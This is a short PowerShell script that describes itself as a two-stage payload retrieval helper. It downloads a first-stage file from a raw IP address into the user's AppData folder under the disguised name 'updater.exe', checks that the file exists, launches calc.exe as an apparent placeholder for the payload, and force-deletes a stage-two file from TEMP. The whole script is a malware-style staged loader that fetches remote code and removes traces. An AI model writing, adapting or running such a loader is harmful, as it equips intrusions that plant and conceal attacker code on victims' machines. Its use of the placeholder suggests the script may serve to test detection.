
<#
.SYNOPSIS
    Two-stage payload retrieval helper.

.DESCRIPTION
    Fetches the first stage into a per-user working path and
    starts the staged loader after a basic existence check.
#>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'https://203.0.113.246/stage1.ps1',
    [string]$WorkingPath = "$env:APPDATA\updater.exe",
    [int]$ConnectionTimeout = 123
)
$ErrorActionPreference = "Stop"

function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$OperationResult = Invoke-Stage1Download -SourceUrl $TransferUrl -DestinationPath $WorkingPath -TimeoutSec $ConnectionTimeout
if ($OperationResult) {
    Start-Process -FilePath "calc.exe"
}
Write-Verbose "stage marker 45 reached"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
